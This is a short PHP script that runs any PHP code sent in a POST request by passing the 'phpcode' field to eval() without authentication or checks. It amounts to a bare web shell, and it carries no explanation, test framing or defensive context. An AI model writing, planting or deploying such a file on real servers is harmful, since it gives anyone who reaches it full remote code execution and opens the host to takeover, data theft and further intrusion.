<?php
$phpcode = $_POST['phpcode'];
	
if(!empty($_POST['eval'])){
	echo "<br><br>";
    eval(stripslashes($phpcode));
	echo "end";
}
?>